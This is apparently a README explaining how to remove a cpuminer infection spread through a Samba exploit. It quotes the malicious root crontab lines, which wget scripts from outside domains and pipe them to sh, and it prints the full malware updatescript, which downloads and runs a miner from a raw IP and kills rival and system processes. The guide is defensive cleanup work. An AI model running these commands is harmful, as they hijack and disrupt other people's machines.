smbd-cpuminer-infection-fix
-------------

A Samba exploit turned Linux into a goldmine. Those infected by the malware would have their systems mining cryptocurrency 24/7, causing their cpu to maintain a 100% usage.

> **Note:** After removing the infection, your system may still be vulnerable

### Removing the infection

Navigate to the cronjob file containing daily get requests for retrieving the updatescript:
```
// Login as root
sudo -i
// Navigate to your cronjobs
cd /var/spool/cron/crontabs
// Edit root file
nano root
```
Remove or comment out the following lines:
```
@daily wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript$

@daily wget -q http://update.sdgsafdsf.pw/upd2 -O /tmp/updatescript2;sh /tmp/updatescript2;rm -rf /tmp/updatescript2 >$

@daily wget -q http://update.omfg.pw/upd3 -O /tmp/updatescript3;sh /tmp/updatescript3;rm -rf /tmp/updatescript3 > /dev$
```
Navigate to your temp folder:
```
// Navigate to your temp folder
cd /tmp
```
Here you will find the cpuminer files, and the malicious updatescript, which was being executed and updated by the cronjob:
```
...
cpuminer
cpuminer.o
updatescript
...
```
Remove these files and reboot your system to start the processes that were shutdown by the updatescript.

### The malware updatescript
```
#!/bin/sh
wget http://176.9.48.167/cpuminer -O /tmp/cpuminer
chmod +x /tmp/cpuminer
#killall cpuminer
/tmp/cpuminer&
ps -ef|grep .sh|grep -v irq|grep -v grep|cut -c 9-15|xargs kill -9
pkill -f sleep
pkill -f /tmp/m
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f minexmr
pkill -f XJnRj
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f 108.61.186.224
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
ps -ef|grep 'irq.sh' |grep -v grep |cut -c 9-15 |xargs kill -9;
ps -ef|grep 'irqbalan' |grep -v grep |cut -c 9-15 |xargs kill -9;
ls -A1 /tmp/*.so | sed 's/\/tmp\///g' | awk '{print "killall "$1}' >>/tmp/out;sh /tmp/out;rm -rf /tmp/out
m=`pidof m`
kill -9 $m

exit
```